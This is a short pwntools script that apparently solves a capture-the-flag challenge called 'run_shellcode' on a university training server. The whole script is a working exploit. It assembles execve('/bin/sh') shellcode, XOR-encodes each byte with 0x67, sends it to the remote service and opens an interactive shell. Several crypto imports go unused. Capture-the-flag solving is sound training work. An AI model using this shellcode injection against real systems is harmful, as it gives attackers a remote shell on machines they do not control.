from pwn import *
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Util.number import long_to_bytes, bytes_to_long
import string
import math

# context.terminal = ["tmux", "new-window"]
elf = ELF("./run_shellcode")
# p = elf.process()
p = remote('cyberchallenge.diag.uniroma1.it', 5013)
# gdb.attach(p)
context.arch = elf.arch
# shellcode = b"\x31\xc0\x31\xc9\x99\x50\x68\x2f\x76\x69\x6d\x68\x2f\x62\x69\x6e\x68\x2f\x75\x73\x72\x89\xe3\xb0\x0b\xcd\x80"
shellcode = asm("""
    xor eax,eax
    push eax
    push 0x68732f
    push 0x6e69622f
    mov ebx, esp
    mov ecx, 0
    mov eax, 0x0b
    xor edx, edx
    int 0x80 
    """)
xorred = bytearray(b'')
print(shellcode)
for i in range(len(shellcode)):
    xorred.append(shellcode[i]^0x67 )
p.send(xorred)
p.interactive()